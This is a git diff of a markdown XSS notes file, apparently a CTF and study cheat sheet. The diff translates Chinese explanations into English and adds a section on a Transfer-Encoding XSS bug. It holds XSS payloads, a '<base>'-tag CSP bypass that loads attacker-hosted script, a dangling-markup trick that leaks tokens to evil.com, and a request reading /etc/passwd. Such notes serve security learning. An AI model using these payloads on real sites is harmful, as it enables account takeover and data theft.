@@ -36,8 +36,9 @@ Attention: Only reflective stored would interact with server because server need
 *  [CSP Introduction and bypass](#csp-intro-and-bypass)  
 *  [Regular expression](#regular-expression)  
 *  [Some tricks played in CTF](#some-tricks-played-in-ctf)  
-*  [pop-up](#pop-up)  
+*  [pop up](#pop-up)  
 *  [Cheatsheet](#cheatsheet)    
+*  [An interesting feature related to Transfer-Encoding](#an-interesting-feature-related-to-transfer-encoding)  
 *  [Reference](#reference)
 
 # XSS detection
@@ -287,8 +288,8 @@ js中會用正規表達式來過濾危險字符
 [Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
 
 # Some tricks played in CTF  
-這裡整理一些攻擊手勢以及比賽中碰到的思路  
-* 不同的`<tag>`做利用  
+Here are something what I learned in sites or CTF.  
+* Exploit with various `<tag>`  
 ```js
 // script
 <script>a=prompt;a(1)</script>
@@ -324,22 +325,22 @@ js中會用正規表達式來過濾危險字符
 [XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
 * Vue.js  
 with SSTI  
-* `<base>`覆蓋相對路徑下的js  
-這是我在RCTF-2018中碰到的比賽思路，CSP沒有限制`base-uri`因此可以用`<base>`繞過，而頁面中剛好又有用相對路徑引用外部的js檔，我們便可以自己偽造一個無視CSP的js  
+* `<base>` overwrites the js in relative path  
+This is what I learned in RCTF-2018, CSP doesn't limit `base-uri` cause to `<base>` bypass, and there are also relative js imported from outside, now we can forge a js which is able to ignore the CSP rules.  
 **Exploit**:  
-:point_down: 頁面中被插入`<base href="http://controlled_domain/">`  
-:point_down: 被引入的`/assets/jquery.min.js`全都變成`http://controlled_domain/assets/jquery.min.js`  
-:point_down: `controlled_domain/assets/jquery.min.js`我們可以在裡面插入`location.href=url;`  
-:point_down: 當我們訪問最前面被插入`<base>`的頁面時就會被導到這個`url`囉！  
-細節詳見：[rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
-* `<base target>`竊取頁面內容  
-跟上面同樣利用`<base>`tag但是觀念完全不同  
+:point_down: insert `<base href="http://controlled_domain/">`  
+:point_down: imported `/assets/jquery.min.js` becomes `http://controlled_domain/assets/jquery.min.js`  
+:point_down: `controlled_domain/assets/jquery.min.js` can be inserted with `location.href=url;`  
+:point_down: when we visit the page inserted with `<base>`, we will be redirect to `url`!  
+More details: [rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
+* `<base target>` steal the content of pages(token)  
+Also use the tag of `<base>` but the concept is different  
 **Exploit**:  
-:point_down: 透過xss漏洞插入不完整的`<base target>`標籤到頁面中  
-:point_down: `target`讓頁面中所有URL[http://evil.com/](http://evil.com/)的page都設下了同名的`window.name`!  
-:point_down: [http://evil.com/](http://evil.com/)頁面中有`<script>alert(name);</script>`的功能  
-:point_down: 彈框的內容為target的name  
-[參考原文](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  
+:point_down: insert an uncompleted `<base target>` to the page  
+:point_down: `target` makes all URL's page[http://evil.com/](http://evil.com/)in current page have a same `window.name`!  
+:point_down: page of [http://evil.com/](http://evil.com/) has `<script>alert(name);</script>`  
+:point_down: the content of pop block is the name of the target  
+[reference](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  
 
 # pop up
 Currently most of the browsers have stop from poping up window  
@@ -389,6 +390,10 @@ xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send("url=file:///etc/passwd");
 ```  
 [Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
+
+# An interesting feature related to Transfer-Encoding
+If POST request includeds header of `Transfer-Encoding: chunked`, the data stream would be responded to client without any changes. This causes to the malicious content such like XSS.(Has been patched in the lastest version)  
+[XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)
 
 # Reference
 1. The Web Application Hacker's Handbook  
